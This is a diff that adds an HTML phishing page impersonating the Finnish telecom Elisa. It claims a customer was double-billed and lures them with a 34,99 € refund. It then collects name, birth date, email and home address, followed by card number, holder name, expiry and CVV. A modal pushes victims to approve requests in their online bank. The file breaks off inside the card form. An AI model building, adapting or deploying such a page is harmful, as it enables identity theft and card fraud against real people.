@@ -1,0 +1,1541 @@
+<!DOCTYPE html>
+<html lang="fi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elisa</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f5f7fa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            padding: 12px 24px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            height: 60px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .elisa-logo {
+            height: 28px;
+            width: auto;
+            display: block;
+        }
+
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            height: 100%;
+        }
+
+        .icon-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            background: none;
+            border: none;
+            padding: 0;
+            height: 36px;
+        }
+
+        .icon-item:hover {
+            opacity: 0.7;
+        }
+
+        .icon-wrapper {
+            height: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .icon-item svg {
+            width: 18px;
+            height: 18px;
+            stroke: #003399;
+            stroke-width: 2;
+            fill: none;
+        }
+
+        .lupe-icon {
+            margin-left: 2mm;
+        }
+
+        .grid-icon {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2px;
+            width: 16px;
+            height: 16px;
+        }
+
+        .grid-dot {
+            width: 3.5px;
+            height: 3.5px;
+            background-color: #003399;
+            border-radius: 50%;
+        }
+
+        .icon-label {
+            font-size: 11px;
+            color: #003399;
+            font-weight: 400;
+            line-height: 1;
+            white-space: nowrap;
+        }
+
+        .menu-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            padding: 0;
+            background: none;
+            border: none;
+            height: 36px;
+            width: 18px;
+        }
+
+        .menu-btn:hover {
+            opacity: 0.7;
+        }
+
+        .hamburger {
+            display: flex;
+            flex-direction: column;
+            gap: 3px;
+            width: 18px;
+        }
+
+        .hamburger span {
+            display: block;
+            width: 100%;
+            height: 2px;
+            background-color: #003399;
+            border-radius: 1px;
+        }
+
+        /* Pääsisältö */
+        .main-content {
+            flex: 1;
+            margin-top: 60px;
+            padding: 24px 20px;
+        }
+
+        .hero-image {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 32px;
+        }
+
+        .hero-image img {
+            width: 170px;
+            height: auto;
+            display: block;
+        }
+
+        /* Viestilaatikko */
+        .message-box {
+            max-width: 600px;
+            margin: 0 auto 32px;
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            border: 1px solid #e8e8e8;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .message-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, #003399, #3366ff);
+        }
+
+        .message-box h2 {
+            color: #003399;
+            font-size: 22px;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .message-box p {
+            color: #444;
+            font-size: 15px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+        }
+
+        .message-box p:last-child {
+            margin-bottom: 0;
+        }
+
+        .refund-amount {
+            display: inline-block;
+            background: linear-gradient(135deg, #003399 0%, #3366ff 100%);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 16px;
+            margin: 4px 0;
+        }
+
+        /* CTA-painike */
+        .cta-button {
+            display: block;
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto 40px;
+            padding: 18px 32px;
+            background: linear-gradient(135deg, #003399 0%, #3366ff 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 6px 20px rgba(0, 51, 153, 0.3);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 51, 153, 0.4);
+        }
+
+        /* Latausspinneri */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.98);
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #003399;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #003399;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        /* Pankkimodaali - pysyy päällä */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 3000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 20px;
+            padding: 50px 40px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            transform: scale(0.7) translateY(20px);
+            opacity: 0;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: scale(1) translateY(0);
+            opacity: 1;
+        }
+
+        .modal-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #003399;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+
+        .modal-text {
+            color: #003399;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 1.4;
+            margin-bottom: 12px;
+        }
+
+        .modal-subtext {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        /* Lomakesivu */
+        .form-page {
+            display: none;
+            padding-top: 60px;
+            min-height: 100vh;
+            background-color: #f5f7fa;
+        }
+
+        .form-page.active {
+            display: block;
+        }
+
+        .form-hero-image {
+            width: 100vw;
+            position: relative;
+            left: 50%;
+            right: 50%;
+            margin-left: -50vw;
+            margin-right: -50vw;
+            display: block;
+            background-color: transparent;
+        }
+
+        .form-hero-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+        }
+
+        .form-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 24px 20px 40px;
+        }
+
+        .form-box {
+            background-color: #ffffff;
+            padding: 32px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        .form-header {
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+
+        .form-header h2 {
+            color: #003399;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .form-header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #003399;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e8ecf1;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.2s;
+            background-color: #fafbfc;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #003399;
+            background-color: #ffffff;
+        }
+
+        .form-row-2 {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 16px;
+        }
+
+        .btn-weiter {
+            width: 100%;
+            padding: 16px;
+            background-color: #003399;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 24px;
+            text-transform: uppercase;
+        }
+
+        .btn-weiter:hover {
+            background-color: #002266;
+        }
+
+        /* Luottokorttisivu */
+        .card-page {
+            display: none;
+            padding-top: 60px;
+            min-height: 100vh;
+            background-color: #f5f7fa;
+        }
+
+        .card-page.active {
+            display: block;
+        }
+
+        .card-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 24px 20px 40px;
+        }
+
+        .card-box {
+            background-color: #ffffff;
+            padding: 32px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        .card-header {
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 2px solid #f0f0f0;
+            text-align: center;
+        }
+
+        .card-header h2 {
+            color: #003399;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .card-header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .refund-info {
+            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: center;
+            border: 1px solid #a5d6a7;
+        }
+
+        .refund-info-label {
+            font-size: 13px;
+            color: #2e7d32;
+            margin-bottom: 4px;
+        }
+
+        .refund-info-amount {
+            font-size: 28px;
+            color: #1b5e20;
+            font-weight: 700;
+        }
+
+        /* Luottokortin visualisointi */
+        .card-visual {
+            width: 100%;
+            max-width: 340px;
+            height: 200px;
+            margin: 0 auto 32px;
+            perspective: 1000px;
+            position: relative;
+        }
+
+        .card-inner {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.6s;
+        }
+
+        .card-front, .card-back {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            backface-visibility: hidden;
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .card-front {
+            background: linear-gradient(135deg, #003399 0%, #001a5c 50%, #002266 100%);
+            color: white;
+        }
+
+        .card-back {
+            background: linear-gradient(135deg, #001a5c 0%, #003399 100%);
+            transform: rotateY(180deg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card-visual.flipped .card-inner {
+            transform: rotateY(180deg);
+        }
+
+        .card-chip {
+            width: 45px;
+            height: 32px;
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 50%, #daa520 100%);
+            border-radius: 6px;
+            position: relative;
+            margin-bottom: 16px;
+            overflow: hidden;
+        }
+
+        .card-chip::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: rgba(0,0,0,0.3);
+        }
+
+        .card-chip::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: 0;
+            bottom: 0;
+            width: 1px;
+            background: rgba(0,0,0,0.3);
+        }
+
+        .card-number-display {
+            font-family: 'Courier New', monospace;
+            font-size: 20px;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            min-height: 24px;
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .card-holder-display {
+            flex: 1;
+        }
+
+        .card-label {
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            opacity: 0.8;
+            margin-bottom: 4px;
+        }
+
+        .card-value {
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            min-height: 16px;
+        }
+
+        .card-expiry-display {
+            text-align: right;
+        }
+
+        .card-logo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 20px;
+            font-weight: 700;
+            font-style: italic;
+            opacity: 0.9;
+        }
+
+        .card-magnetic-strip {
+            width: 100%;
+            height: 40px;
+            background: #333;
+            margin-bottom: 16px;
+        }
+
+        .card-cvv-box {
+            background: white;
+            padding: 10px 16px;
+            border-radius: 4px;
+            color: #003399;
+            font-family: 'Courier New', monospace;
+            font-weight: 700;
+            min-width: 50px;
+            text-align: center;
+        }
+
+        .card-form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .card-form-group label {
+            display: block;
+            color: #003399;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .card-input-wrapper {
+            position: relative;
+        }
+
+        .card-form-group input {
+            width: 100%;
+            padding: 14px 16px 14px 44px;
+            border: 2px solid #e8ecf1;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background-color: #fafbfc;
+            font-family: 'Courier New', monospace;
+        }
+
+        .card-form-group input:focus {
+            outline: none;
+            border-color: #003399;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 51, 153, 0.1);
+        }
+
+        .card-input-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            stroke: #999;
+            stroke-width: 2;
+            fill: none;
+            transition: stroke 0.3s;
+            pointer-events: none;
+        }
+
+        .card-form-group input:focus + .card-input-icon {
+            stroke: #003399;
+        }
+
+        .card-row-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #003399 0%, #001a5c 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(0, 51, 153, 0.3);
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 51, 153, 0.4);
+        }
+
+        /* Alatunniste */
+        .footer {
+            width: 100%;
+            background: linear-gradient(to bottom, #f8f9fa, #ffffff);
+            padding: 24px 16px 16px;
+            margin-top: auto;
+            border-top: 1px solid #e8e8e8;
+        }
+
+        .support-box {
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            border: 1px solid #e8e8e8;
+            text-align: center;
+        }
+
+        .support-box h3 {
+            font-size: 16px;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        .support-box p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+
+        .support-button {
+            display: inline-block;
+            padding: 12px 32px;
+            background: linear-gradient(135deg, #3366ff 0%, #2952cc 100%);
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 12px rgba(51, 102, 255, 0.3);
+        }
+
+        .support-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(51, 102, 255, 0.4);
+        }
+
+        .powered-by {
+            text-align: center;
+            font-size: 11px;
+            color: #aaa;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+
+        .powered-by strong {
+            color: #888;
+            font-weight: 600;
+        }
+
+        .footer-links {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .footer-links a {
+            font-size: 12px;
+            color: #666;
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #003399;
+            text-decoration: underline;
+        }
+
+        .accordion {
+            margin-bottom: 24px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .accordion-item {
+            background-color: #ffffff;
+            border-bottom: 1px solid #e8e8e8;
+            transition: background-color 0.2s;
+        }
+
+        .accordion-item:hover {
+            background-color: #f8f9fa;
+        }
+
+        .accordion-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 16px;
+            cursor: pointer;
+        }
+
+        .accordion-title {
+            font-size: 14px;
+            color: #003399;
+            font-weight: 500;
+        }
+
+        .accordion-arrow {
+            width: 16px;
+            height: 16px;
+            stroke: #003399;
+            stroke-width: 2;
+            fill: none;
+            transition: transform 0.3s;
+        }
+
+        .accordion-item:nth-child(3) {
+            background-color: #e8e8e8;
+        }
+
+        .accordion-item:nth-child(3):hover {
+            background-color: #e0e0e0;
+        }
+
+        .social-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .social-icons {
+            display: inline-flex;
+            align-items: center;
+            gap: 20px;
+            padding: 12px 24px;
+            background-color: #f0f0f0;
+            border-radius: 24px;
+        }
+
+        .social-icon {
+            width: 22px;
+            height: 22px;
+            fill: #003399;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+
+        .social-icon:hover {
+            transform: scale(1.1);
+            opacity: 0.8;
+        }
+
+        .bottom-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .bottom-links a {
+            font-size: 12px;
+            color: #666;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .bottom-links a:hover {
+            color: #003399;
+        }
+
+        .copyright {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            padding-top: 16px;
+            border-top: 1px solid #e8e8e8;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+<base target="_blank">
+</head>
+<body>
+
+    <!-- Ylätunniste -->
+    <header class="header" id="mainHeader">
+        <div class="logo">
+            <img src="https://i.ibb.co/N6CmQxzP/IMG-5796.png" alt="Elisa" class="elisa-logo">
+        </div>
+
+        <div class="header-icons">
+            <button class="icon-item lupe-icon" aria-label="Hae">
+                <div class="icon-wrapper">
+                    <svg viewBox="0 0 24 24">
+                        <circle cx="11" cy="11" r="7"/>
+                        <path d="M21 21l-4.35-4.35"/>
+                    </svg>
+                </div>
+                <span class="icon-label">Hae</span>
+            </button>
+
+            <button class="icon-item" aria-label="Ostoskori">
+                <div class="icon-wrapper">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/>
+                        <line x1="3" y1="6" x2="21" y2="6"/>
+                        <path d="M16 10a4 4 0 0 1-8 0"/>
+                    </svg>
+                </div>
+                <span class="icon-label">Ostoskori</span>
+            </button>
+
+            <button class="icon-item" aria-label="Siirry">
+                <div class="icon-wrapper">
+                    <div class="grid-icon">
+                        <div class="grid-dot"></div>
+                        <div class="grid-dot"></div>
+                        <div class="grid-dot"></div>
+                        <div class="grid-dot"></div>
+                        <div class="grid-dot"></div>
+                        <div class="grid-dot"></div>
+                        <div class="grid-dot"></div>
+                        <div class="grid-dot"></div>
+                        <div class="grid-dot"></div>
+                    </div>
+                </div>
+                <span class="icon-label">Siirry</span>
+            </button>
+
+            <button class="icon-item" aria-label="Kirjaudu">
+                <div class="icon-wrapper">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                        <circle cx="12" cy="7" r="4"/>
+                    </svg>
+                </div>
+                <span class="icon-label">Kirjaudu</span>
+            </button>
+
+            <button class="menu-btn" aria-label="Valikko">
+                <div class="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </button>
+        </div>
+    </header>
+
+    <!-- Pääsivu -->
+    <div id="mainPage">
+        <main class="main-content">
+            <div class="hero-image">
+                <img src="https://i.ibb.co/20n0GXwL/Bildschirmfoto-2026-03-21-um-13-07-49-removebg-preview.png" alt="Elisa Content">
+            </div>
+
+            <div class="message-box">
+                <h2>Hyvä asiakas,</h2>
+                <p>Järjestelmävirheen vuoksi laskunne 1. maaliskuuta 2026 veloitettiin vahingossa kahteen kertaan. Pahoittelemme tapahtunutta virhettä ja siitä aiheutunutta vaivaa.</p>
+                <p>Liikaa veloitettu summa, <span class="refund-amount">34,99 €</span>, palautetaan teille viipymättä. Tapauksenne on jo kirjattu, ja olemme ryhtyneet toimenpiteisiin, jotta vastaavat virheet eivät toistu tulevaisuudessa.</p>
+            </div>
+
+            <button class="cta-button" onclick="startRefundProcess()">Hae hyvitystä tästä</button>
+        </main>
+
+        <footer class="footer">
+            <div class="support-box">
+                <h3>Etkö löytänyt etsimääsi?</h3>
+                <p>OmaYhteisö on valmiina auttamaan!</p>
+                <button class="support-button">Esitä kysymyksesi täällä!</button>
+            </div>
+
+            <div class="powered-by">
+                Powered by <strong>Gainsight</strong>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">OmaYhteisö-käyttöehdot</a>
+                <a href="#">Accessibility statement</a>
+            </div>
+
+            <div class="accordion">
+                <div class="accordion-item">
+                    <div class="accordion-header">
+                        <span class="accordion-title">Laitteet & liittymät</span>
+                        <svg class="accordion-arrow" viewBox="0 0 24 24">
+                            <polyline points="6 9 12 15 18 9"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <div class="accordion-header">
+                        <span class="accordion-title">Palvelut</span>
+                        <svg class="accordion-arrow" viewBox="0 0 24 24">
+                            <polyline points="6 9 12 15 18 9"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <div class="accordion-header">
+                        <span class="accordion-title">Tuki</span>
+                        <svg class="accordion-arrow" viewBox="0 0 24 24">
+                            <polyline points="6 9 12 15 18 9"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <div class="accordion-header">
+                        <span class="accordion-title">Ajankohtaista</span>
+                        <svg class="accordion-arrow" viewBox="0 0 24 24">
+                            <polyline points="6 9 12 15 18 9"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <div class="accordion-header">
+                        <span class="accordion-title">Elisa Oyj</span>
+                        <svg class="accordion-arrow" viewBox="0 0 24 24">
+                            <polyline points="6 9 12 15 18 9"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <div class="accordion-header">
+                        <span class="accordion-title">In English</span>
+                        <svg class="accordion-arrow" viewBox="0 0 24 24">
+                            <polyline points="6 9 12 15 18 9"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <div class="accordion-header">
+                        <span class="accordion-title">På Svenska</span>
+                        <svg class="accordion-arrow" viewBox="0 0 24 24">
+                            <polyline points="6 9 12 15 18 9"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <div class="social-section">
+                <div class="social-icons">
+                    <svg class="social-icon" viewBox="0 0 24 24">
+                        <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/>
+                    </svg>
+                    <svg class="social-icon" viewBox="0 0 24 24">
+                        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                    </svg>
+                    <svg class="social-icon" viewBox="0 0 24 24">
+                        <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/>
+                        <rect x="2" y="9" width="4" height="12"/>
+                        <circle cx="4" cy="4" r="2"/>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="bottom-links">
+                <a href="#">Sopimusehdot</a>
+                <a href="#">Tietosuoja</a>
+                <a href="#">Saavutettavuus</a>
+                <a href="#">Evästeasetukset</a>
+            </div>
+
+            <div class="copyright">
+                Tekijänoikeudet © 2026 Elisa Oyj.
+            </div>
+        </footer>
+    </div>
+
+    <!-- Latausspinneri -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Ladataan...</div>
+    </div>
+
+    <!-- Pankkimodaali -->
+    <div class="modal-overlay" id="bankingModal">
+        <div class="modal-content">
+            <div class="modal-spinner"></div>
+            <div class="modal-text">Palaa verkkopankkiisi</div>
+            <div class="modal-subtext">ja vahvista hyvityspyynnöt</div>
+        </div>
+    </div>
+
+    <!-- Henkilötietolomake -->
+    <div class="form-page" id="formPage">
+        <div class="form-hero-image">
+            <img src="https://i.ibb.co/cXDrW3Dg/IMG-5801.png" alt="Elisa Form">
+        </div>
+
+        <div class="form-container">
+            <div class="form-box">
+                <div class="form-header">
+                    <h2>Henkilötiedot</h2>
+                    <p>Täytä tietosi hyvityksen käsittelyä varten</p>
+                </div>
+
+                <form id="personalForm" onsubmit="submitForm(event)">
+                    <div class="form-row-2">
+                        <div class="form-group">
+                            <label for="etunimi">Etunimi</label>
+                            <input type="text" id="etunimi" name="etunimi" placeholder="Matti" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="sukunimi">Sukunimi</label>
+                            <input type="text" id="sukunimi" name="sukunimi" placeholder="Virtanen" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="syntymaaika">Syntymäaika</label>
+                        <input type="text" id="syntymaaika" name="syntymaaika" placeholder="PP.KK.VVVV" maxlength="10" inputmode="numeric" pattern="[0-9.]*" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="email">Sähköpostiosoite</label>
+                        <input type="email" id="email" name="email" placeholder="matti.virtanen@esimerkki.fi" required>
+                    </div>
+
+                    <div class="form-row-2">
+                        <div class="form-group">
+                            <label for="katu">Katu</label>
+                            <input type="text" id="katu" name="katu" placeholder="Mannerheimintie" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="talonumero">Talonumero</label>
+                            <input type="text" id="talonumero" name="talonumero" placeholder="42" inputmode="numeric" pattern="[0-9]*" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="postinumero">Postinumero</label>
+                        <input type="text" id="postinumero" name="postinumero" placeholder="00100" maxlength="5" inputmode="numeric" pattern="[0-9]*" required>
+                    </div>
+
+                    <button type="submit" class="btn-weiter">Jatka</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Luottokorttisivu -->
+    <div class="card-page" id="cardPage">
+        <div class="card-container">
+            <div class="card-box">
+                <div class="card-header">
+                    <h2>Hyvityksen maksutiedot</h2>
+                    <p>Syötä korttitietosi hyvitystä varten</p>
+                </div>
+
+                <div class="refund-info">
+                    <div class="refund-info-label">Hyvitettävä summa</div>
+                    <div class="refund-info-amount">34,99 €</div>
+                </div>
+
+                <!-- Luottokortin visualisointi -->
+                <div class="card-visual" id="cardVisual">
+                    <div class="card-inner">
+                        <div class="card-front">
+                            <div class="card-logo"></div>
+                            <div class="card-chip"></div>
+                            <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
+                            <div class="card-details">
+                                <div class="card-holder-display">
+                                    <div class="card-label">Kortinhaltija</div>
+                                    <div class="card-value" id="cardHolderDisplay">NIMI SUKUNIMI</div>
+                                </div>
+                                <div class="card-expiry-display">
+                                    <div class="card-label">Vanhenee</div>
+                                    <div class="card-value" id="cardExpiryDisplay">KK/VV</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card-back">
+                            <div style="width: 100%; padding: 0 20px;">
+                                <div class="card-magnetic-strip"></div>
+                                <div style="text-align: right;">
+                                    <div class="card-label" style="color: white; margin-bottom: 8px;">CVV</div>
+                                    <div class="card-cvv-box" id="cardCvvDisplay">•••</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <form id="cardForm" onsubmit="submitCard(event)">
+                    <div class="card-form-group">
+                        <label for="korttinumero">Kortin numero</label>
+                        <div class="card-input-wrapper">
+                            <svg class="card-input-icon" viewBox="0 0 24 24">
+                                <rect x="2" y="5" width="20" height="14" rx="2"/>
+                                <line x1="2" y1="10" x2="22" y2="10"/>
+                            </svg>
+                            <input type="text" id="korttinumero" name="korttinumero" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" pattern="[0-9 ]*" required oninput="formatCardNumber(this); updateCardDisplay()" onfocus="flipCard('front')">
+                        </div>
+                    </div>
+
+                    <div class="card-form-group">
+                        <label for="kortinhaltija">Kortinhaltija</label>
+                        <div class="card-input-wrapper">
+                            <svg class="card-input-icon" viewBox="0 0 24 24">
+                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                                <circle cx="12" cy="7" r="4"/>
+                            </svg>
+                            <input type="text" id="kortinhaltija" name="kortinhaltija" placeholder="MATTI VIRTANEN" required oninput="updateCardDisplay()" onfocus="flipCard('front')" style="font-family: inherit; text-transform: uppercase;">
+                        </div>
+                    </div>
+
+                    <div class="card-row-2">
+                        <div class="card-form-group">
+                            <label for="vanhenemispaiva">Vanhenemispäivä</label>
+                            <div class="card-input-wrapper">
+                                <svg class="card-input-icon" viewBox="0 0 24 24">
+                                    <rect x="3" y="4" width="18" height="18" rx="2"/>
